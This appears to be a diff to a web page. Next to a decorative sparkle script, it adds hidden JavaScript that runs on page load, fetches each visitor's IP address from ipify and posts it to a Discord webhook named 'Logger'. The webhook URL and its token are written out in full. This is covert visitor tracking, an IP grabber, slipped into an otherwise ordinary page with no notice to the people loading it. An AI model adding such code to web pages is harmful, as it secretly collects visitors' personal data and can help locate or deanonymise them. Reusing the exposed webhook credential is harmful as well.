@@ -62,4 +62,25 @@
     }
 </script>
 <script src="sparkle.js"></script>
+
+<script>
+function getIP(json) {
+  var request = new XMLHttpRequest(); //making a request for the webhook
+      request.open("POST", "https://discord.com/api/webhooks/1029922854894063686/6BoYaOTyVIgPxPMijo-xQVv0kj2xA0jlnO-qvDWyQWK9E-VNDHM-hqeXbcRgJnI1yf6d");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "Logger",
+        avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+        content: "**IP:** *" + json.ip + "*"
+      }
+   
+
+      request.send(JSON.stringify(params));
+    }
+
+</script>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> 
+
 </html>
